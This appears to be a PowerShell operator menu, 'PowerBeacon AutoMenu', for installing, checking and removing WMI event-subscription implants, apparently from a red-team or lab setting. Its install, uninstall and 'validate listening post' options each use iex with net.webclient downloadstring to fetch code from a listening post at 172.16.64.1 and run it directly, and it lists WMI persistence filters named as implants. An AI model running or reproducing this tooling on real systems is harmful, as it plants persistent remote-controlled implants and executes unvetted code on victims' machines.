$PBFilter="Demo"
function Check-Install {
	try{
        $implants=gwmi -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE '$PBFilter%'" | Select Name,Query
		if (@($implants).Count -gt 0) {
			$implants | Format-Table -AutoSize | Out-Host
        } 
		else {
			Write-Host
			Write-Host ">>> No matching implants installed."
			Write-Host 
}
		read-host ">>> Press Enter to Continue"
	}
	Catch{ Write-Host ">>> Check Failed";sleep 1;return}
}
function Validate-LP {
    Write-Host ">>> Checking Listening Post"
    try{
    iex(new-object net.webclient).downloadstring('http://172.16.64.1/Validate') | out-host
	sleep 1
	read-host ">>> Press Enter to Continue"
    }
    catch{Write-host ">>> Validation Check Failed";read-host ">>> Press Enter to Continue"}
}

function Install-PowerBeacon {
    Write-Host ">>> Installing PowerBeacon"
    try{
    iex(new-object net.webclient).downloadstring('http://172.16.64.1/Install') | out-host
	Write-Host ">>> Install Complete...Checking"
	Check-Install
	
    }
    catch{Write-host ">>>Install Failed";sleep 2; return}
}
function Uninstall-PowerBeacon {
    Write-Host ">>> Installing PowerBeacon"
    try{
    iex(new-object net.webclient).downloadstring('http://172.16.64.1/Uninstall') | out-host
	Write-Host ">>> Uninstall Complete...Checking"
	Check-Install
	
    }
    catch{Write-host ">>>Install Failed";sleep 2; return}
}

Function Show-Menu {
Clear
Write-Host "========================="
Write-Host " PowerBeacon AutoMenu"
Write-Host "========================="
Write-Host "1) Check Install"
Write-Host "2) Validate LP"
Write-Host "3) Install PowerBeacon"
Write-Host "4) Uninstall"
Write-Host "5) Exit"
Write-Host ""
}


do {
Show-Menu
$choice = Read-Host "Select Option?"
switch ($choice) {
    "1" { Check-Install }
    "2" { Validate-LP }
    "3" { Install-PowerBeacon }
	"4" { Uninstall-PowerBeacon }
	"5" { Clear;Write-Host "Exiting";sleep 1;clear;exit}
    default { Write-Warning "Invalid choice. Try again." }
}
} while ($true)
